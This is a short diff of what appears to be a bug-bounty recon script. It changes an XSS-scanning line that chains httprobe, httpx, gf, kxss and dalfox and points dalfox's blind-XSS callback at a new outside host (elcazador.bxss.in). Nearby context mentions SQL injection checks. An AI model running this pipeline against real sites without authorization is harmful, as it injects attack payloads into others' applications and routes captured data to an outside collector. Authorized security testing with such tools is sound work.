@@ -111,7 +111,7 @@ cat /root/Projects/$domain/sorted_subdomain.txt | httpx | python3  /root/Tools/s
 
 echo -e "\n Checking for XSS"
 
-cat /root/Projects/$domain/All_Urls.txt | httprobe | httpx |gf xss | kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b https://tikka.xss.ht
+cat /root/Projects/$domain/All_Urls.txt | httprobe | httpx |gf xss | kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b  https://elcazador.bxss.in
 
 echo -e "\n Checking for SQLI"
 
